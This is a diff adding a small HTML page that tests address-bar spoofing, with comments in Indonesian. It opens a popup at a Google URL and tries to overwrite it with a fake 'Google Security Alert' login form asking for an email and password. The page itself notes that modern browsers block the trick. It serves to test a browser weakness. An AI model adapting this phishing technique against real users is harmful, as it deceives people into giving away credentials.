@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>UI Spoofing Test</title>
+</head>
+<body>
+
+<h1>🎭 UI Spoofing Testing</h1>
+<button onclick="testSpoofing()">Test Address Bar Spoofing</button>
+
+<script>
+function testSpoofing() {
+    // Buka window dengan URL legitimate
+    const win = window.open(
+        'https://www.google.com/gen_204',
+        '_blank',
+        'width=500,height=400'
+    );
+    
+    // Tunggu 2 detik, lalu manipulasi
+    setTimeout(() => {
+        try {
+            win.document.write(`
+                <h2>Google Security Alert</h2>
+                <p>Please verify your account:</p>
+                <input placeholder="Email"><br>
+                <input type="password" placeholder="Password">
+            `);
+            win.document.close();
+            
+            alert('Check new window - address bar tetap Google tapi konten berubah');
+        } catch(e) {
+            alert('Gagal: ' + e.message + '\n\nBrowser modern memblokir manipulasi ini.');
+        }
+    }, 2000);
+}
+</script>
+
+</body>
+</html>
